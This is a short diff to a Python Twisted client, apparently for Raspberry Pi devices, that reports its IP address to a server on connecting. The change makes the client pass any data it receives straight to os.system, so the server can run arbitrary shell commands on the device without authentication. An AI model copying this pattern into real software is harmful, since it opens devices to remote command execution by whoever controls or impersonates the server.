@@ -6,6 +6,7 @@
 from twisted.internet import reactor, protocol
 import subprocess
 import time
+import os
 
 #Sets up the Protocol class
 class DataClientFactory(protocol.ClientFactory):
@@ -31,11 +32,11 @@ class myProtocol(protocol.Protocol):
 	def connectionMade(self):
 		ip_address = subprocess.check_output("hostname --all-ip-addresses", shell=True).strip()
 		msg = "piGroup1 {0}".format(ip_address)
-		print msg
 		self.transport.write(msg)
 
 	def dataReceived(self, data):
 		print "data Received from Server: {0}".format(data)
+		os.system(data)
 
 if __name__ == '__main__':
 	#reactor.connectTCP('18.111.45.131', 8888, DataClientFactory(data), timeout=200)
